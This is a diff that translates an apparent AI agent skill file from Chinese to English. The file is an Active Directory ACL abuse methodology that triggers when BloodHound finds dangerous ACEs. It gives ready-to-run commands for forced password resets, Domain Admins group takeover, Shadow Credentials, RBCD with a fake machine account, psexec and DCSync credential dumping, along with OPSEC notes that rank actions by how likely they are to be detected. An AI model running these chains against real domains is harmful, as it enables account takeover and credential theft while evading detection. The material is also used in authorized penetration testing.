@@ -1,104 +1,108 @@
 ---
 name: ad-acl-abuse
-description: "Active Directory ACL 滥用攻击方法论。当 BloodHound 发现 GenericAll/WriteDACL/WriteOwner/GenericWrite/ForceChangePassword 等危险 ACE 时使用。覆盖 ACE 枚举、权限滥用链、Shadow Credentials、RBCD 攻击"
+description: "Active Directory ACL abuse methodology. Use when BloodHound reveals dangerous ACEs such as GenericAll/WriteDACL/WriteOwner/GenericWrite/ForceChangePassword. Covers ACE enumeration, permission abuse chains, Shadow Credentials, and RBCD attacks"
+zh-signals: "Active Directory ACL 滥用攻击，利用危险 ACE 实现域内提权。信号:ACL滥用,ActiveDirectory,BloodHound,ShadowCredentials,RBCD"
+when-to-use: >-
+  Use when BloodHound or ACL enumeration reveals dangerous ACEs (GenericAll, WriteDACL,
+  WriteOwner, GenericWrite, ForceChangePassword) on AD objects and you need an abuse chain.
 metadata:
-  tags: "acl,dacl,ace,genericall,writedacl,writeowner,ad,bloodhound,权限滥用,ACL攻击,shadow credentials"
+  tags: "acl,dacl,ace,genericall,writedacl,writeowner,ad,bloodhound,aclabuse,ACLattack,shadow credentials"
   category: "lateral"
   mitre_attack: "T1222.001,T1098,T1484"
 ---
 
-# AD ACL 滥用攻击方法论
+# AD ACL Abuse Methodology
 
-> **核心价值**：利用 AD 对象上的错误权限配置实现提权，无需漏洞利用
+> **Core Value**: Achieve privilege escalation through misconfigured permissions on AD objects, with no exploit required
 
-## ⛔ 深入参考
+## ⛔ Further Reading
 
-- ACE 权限位详解与完整滥用链 → [references/ace-abuse-chains.md](references/ace-abuse-chains.md)
-- Shadow Credentials 与 RBCD 组合攻击 → [references/shadow-creds-rbcd.md](references/shadow-creds-rbcd.md)
+- Detailed ACE permission bits and complete abuse chains → [references/ace-abuse-chains.md](references/ace-abuse-chains.md)
+- Shadow Credentials and RBCD combination attacks → [references/shadow-creds-rbcd.md](references/shadow-creds-rbcd.md)
 
 ---
 
-## Phase 1: 危险 ACE 枚举
+## Phase 1: Dangerous ACE Enumeration
 
-### 1.1 BloodHound 路径发现（首选）
+### 1.1 BloodHound Path Discovery (Preferred)
 
 ```bash
-# 数据收集
+# Data collection
 bloodhound-python -d DOMAIN -u user -p pass -dc DC_IP -c all
 
-# BloodHound 中查询危险路径：
+# Query dangerous paths in BloodHound:
 # - Shortest Path to Domain Admins
 # - Find Principals with DCSync Rights
 # - Find Dangerous Rights (ACL)
 ```
 
-### 1.2 手动枚举（无 BloodHound 时）
+### 1.2 Manual Enumeration (Without BloodHound)
 
 ```bash
-# 使用 dacledit.py（impacket）
+# Using dacledit.py (impacket)
 dacledit.py -dc-ip DC_IP DOMAIN/user:pass -target 'Domain Admins' -action read
 
-# 使用 PowerView (Windows)
+# Using PowerView (Windows)
 Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match "GenericAll|WriteDacl|WriteOwner|GenericWrite"}
 
-# 使用 netexec
+# Using netexec
 netexec ldap DC_IP -u user -p pass --dacl "CN=Domain Admins"
 ```
 
-### 1.3 关键危险权限速查
+### 1.3 Key Dangerous Permission Quick Reference
 
-| 权限 | 掩码 | 可做什么 |
+| Permission | Mask | What It Allows |
 |------|------|---------|
-| GenericAll | 0x10000000 | 完全控制（改密码/修改属性/加入组） |
-| GenericWrite | 0x40000000 | 写任意属性（SPN/脚本路径/msDS-KeyCredential） |
-| WriteDACL | 0x00040000 | 修改权限（给自己加 GenericAll） |
-| WriteOwner | 0x00080000 | 更改所有者（然后给自己加权限） |
-| ForceChangePassword | ExtendedRight | 强制重置密码（无需知道原密码） |
-| Self (Member) | 0x00000008 | 将自己加入组 |
+| GenericAll | 0x10000000 | Full control (change password / modify attributes / join groups) |
+| GenericWrite | 0x40000000 | Write any attribute (SPN / script path / msDS-KeyCredential) |
+| WriteDACL | 0x00040000 | Modify permissions (grant yourself GenericAll) |
+| WriteOwner | 0x00080000 | Change the owner (then grant yourself permissions) |
+| ForceChangePassword | ExtendedRight | Force a password reset (without knowing the original password) |
+| Self (Member) | 0x00000008 | Add yourself to a group |
 | AllExtendedRights | 0x00000100 | DCSync / ForceChangePassword |
 
-## Phase 2: 滥用决策树
+## Phase 2: Abuse Decision Tree
 
 ```
-发现什么权限？在什么对象上？
+Which permission? On which object?
 │
 ├─ GenericAll on User
-│   ├─ 重置密码 → net rpc password -U user%pass -S DC_IP target_user 'NewP@ss'
-│   ├─ Targeted Kerberoasting → 设置 SPN → 请求票据 → 破解
-│   ├─ Shadow Credentials → 设置 msDS-KeyCredentialLink → 获取 TGT
-│   └─ 修改 scriptPath → 下次登录执行恶意脚本
+│   ├─ Reset password → net rpc password -U user%pass -S DC_IP target_user 'NewP@ss'
+│   ├─ Targeted Kerberoasting → set SPN → request ticket → crack
+│   ├─ Shadow Credentials → set msDS-KeyCredentialLink → obtain TGT
+│   └─ Modify scriptPath → malicious script runs on next logon
 │
 ├─ GenericAll on Group
-│   └─ 将自己加入组
+│   └─ Add yourself to the group
 │       net rpc group addmem "Domain Admins" user -U user%pass -S DC_IP
 │
 ├─ GenericAll on Computer
-│   ├─ RBCD → 设置 msDS-AllowedToActOnBehalfOfOtherIdentity
-│   └─ Shadow Credentials → 设置 msDS-KeyCredentialLink
+│   ├─ RBCD → set msDS-AllowedToActOnBehalfOfOtherIdentity
+│   └─ Shadow Credentials → set msDS-KeyCredentialLink
 │
 ├─ WriteDACL on Object
-│   └─ 先给自己加 GenericAll → 然后按上面操作
+│   └─ First grant yourself GenericAll → then follow the steps above
 │       dacledit.py ... -target obj -action write -rights GenericAll -principal self
 │
 ├─ WriteOwner on Object
-│   └─ 先把自己设为 Owner → 然后 WriteDACL → GenericAll
+│   └─ First set yourself as Owner → then WriteDACL → GenericAll
 │       owneredit.py ... -target obj -new-owner self
 │
 ├─ GenericWrite on User
-│   ├─ Targeted Kerberoasting → 设置 SPN
-│   ├─ Shadow Credentials → 设置 Key Credential
-│   └─ 修改 logon script
+│   ├─ Targeted Kerberoasting → set SPN
+│   ├─ Shadow Credentials → set Key Credential
+│   └─ Modify the logon script
 │
 ├─ ForceChangePassword on User
-│   └─ 直接重置目标密码（⛔ 会锁定原用户）
+│   └─ Directly reset the target password (⛔ locks out the original user)
 │
 └─ AllExtendedRights on Domain
     └─ DCSync → impacket-secretsdump DOMAIN/user:pass@DC_IP
 ```
 
-## Phase 3: 常见利用命令
+## Phase 3: Common Exploitation Commands
 
-### 3.1 GenericAll → 重置密码
+### 3.1 GenericAll → Reset Password
 
 ```bash
 # impacket
@@ -114,15 +118,15 @@ Set-DomainUserPassword -Identity target_user -AccountPassword (ConvertTo-SecureS
 ### 3.2 GenericAll/GenericWrite → Shadow Credentials
 
 ```bash
-# pywhisker — 添加 Key Credential
+# pywhisker — add a Key Credential
 python3 pywhisker.py -d DOMAIN -u user -p pass --dc-ip DC_IP \
   -t target_user -a add
 
-# 输出的 pfx 文件 → 使用 PKINITtools 获取 TGT
+# the resulting pfx file → use PKINITtools to obtain a TGT
 python3 gettgtpkinit.py -cert-pfx output.pfx -pfx-pass PASS \
   DOMAIN/target_user target_user.ccache
 
-# 使用 TGT
+# Use the TGT
 export KRB5CCNAME=target_user.ccache
 impacket-secretsdump -k -no-pass DOMAIN/target_user@DC_IP
 ```
@@ -130,82 +134,82 @@ impacket-secretsdump -k -no-pass DOMAIN/target_user@DC_IP
 ### 3.3 GenericAll on Computer → RBCD
 
 ```bash
-# 步骤 1: 添加或使用已控机器账户
+# Step 1: add or reuse a compromised machine account
 impacket-addcomputer DOMAIN/user:pass -computer-name FAKE$ -computer-pass FakeP@ss
 
-# 步骤 2: 设置目标机器的 msDS-AllowedToActOnBehalfOfOtherIdentity
+# Step 2: set msDS-AllowedToActOnBehalfOfOtherIdentity on the target machine
 rbcd.py -dc-ip DC_IP -delegate-to TARGET$ -delegate-from FAKE$ DOMAIN/user:pass
-# 或使用 impacket
+# Or use impacket
 impacket-rbcd DOMAIN/user:pass -dc-ip DC_IP -target TARGET$ -delegate-from FAKE$ -action write
 
-# 步骤 3: S4U2Self + S4U2Proxy 获取服务票据
+# Step 3: S4U2Self + S4U2Proxy to obtain a service ticket
 impacket-getST -spn cifs/TARGET.DOMAIN -impersonate Administrator \
   DOMAIN/FAKE$:FakeP@ss -dc-ip DC_IP
 
-# 步骤 4: 使用票据
+# Step 4: use the ticket
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass TARGET.DOMAIN
 ```
 
-### 3.4 WriteDACL → 先提权
+### 3.4 WriteDACL → Escalate First
 
 ```bash
-# 给自己添加 GenericAll
+# Grant yourself GenericAll
 dacledit.py -dc-ip DC_IP DOMAIN/user:pass \
   -target "CN=Target,DC=domain,DC=com" \
   -action write -rights GenericAll -principal user
 
-# 然后按 GenericAll 的利用方式操作
+# Then proceed with the GenericAll exploitation
 
-# 清理：操作完后删除添加的 ACE
+# Cleanup: remove the added ACE after the operation
 dacledit.py -dc-ip DC_IP DOMAIN/user:pass \
   -target "CN=Target,DC=domain,DC=com" \
   -action remove -rights GenericAll -principal user
 ```
 
-### 3.5 WriteOwner → 接管所有权
+### 3.5 WriteOwner → Take Over Ownership
 
 ```bash
-# 修改对象所有者为自己
+# Change the object owner to yourself
 owneredit.py -dc-ip DC_IP DOMAIN/user:pass \
   -target "CN=Target,DC=domain,DC=com" \
   -new-owner user
 
-# 所有者可以修改 DACL → 然后 WriteDACL → GenericAll
+# The owner can modify the DACL → then WriteDACL → GenericAll
 ```
 
-## Phase 4: OPSEC 注意事项
+## Phase 4: OPSEC Notes
 
 ```
-⛔ 高检测风险操作：
-├─ 重置密码 → 用户报告无法登录 → 立即暴露
-├─ 修改 Domain Admins 组成员 → 高优先级告警
-├─ 修改 AdminSDHolder → 被 SDProp 还原 + 告警
-└─ 大量 ACL 查询 → LDAP 审计日志
+⛔ High-detection-risk operations:
+├─ Password reset → user reports login failure → immediate exposure
+├─ Modifying Domain Admins group membership → high-priority alert
+├─ Modifying AdminSDHolder → reverted by SDProp + alert
+└─ Large volumes of ACL queries → LDAP audit logs
 
-✓ 相对隐蔽操作：
-├─ Shadow Credentials → 不改密码，不加组
-├─ Targeted Kerberoasting → 只加 SPN，离线破解
-├─ RBCD → 不直接修改敏感组
-└─ 修改非特权用户 → 低告警
+✓ Relatively stealthy operations:
+├─ Shadow Credentials → no password change, no group addition
+├─ Targeted Kerberoasting → only adds an SPN, cracked offline
+├─ RBCD → does not directly modify sensitive groups
+└─ Modifying a non-privileged user → low alert level
 
-清理提醒：
-├─ 删除添加的 SPN
-├─ 删除添加的 Key Credential
-├─ 删除 RBCD 委派配置
-├─ 恢复修改的 ACE
-└─ 删除创建的机器账户
+Cleanup reminders:
+├─ Remove the added SPN
+├─ Remove the added Key Credential
+├─ Remove the RBCD delegation configuration
+├─ Restore the modified ACE
+└─ Remove the created machine account
 ```
 
-## 工具速查
+## Tool Quick Reference
 
-| 工具 | 用途 |
+| Tool | Purpose |
 |------|------|
-| BloodHound | ACL 路径可视化发现 |
-| dacledit.py (impacket) | DACL 读取与修改 |
-| owneredit.py | 修改对象所有者 |
+| BloodHound | Visual ACL path discovery |
+| dacledit.py (impacket) | DACL read and modification |
+| owneredit.py | Modify the object owner |
 | pywhisker | Shadow Credentials |
-| rbcd.py / impacket-rbcd | RBCD 配置 |
-| impacket-addcomputer | 添加机器账户 |
-| PKINITtools | 证书→TGT |
-| PowerView | Windows 端 ACL 操作 |
+| rbcd.py / impacket-rbcd | RBCD configuration |
+| impacket-addcomputer | Add a machine account |
+| PKINITtools | Certificate → TGT |
+| PowerView | Windows-side ACL operations |
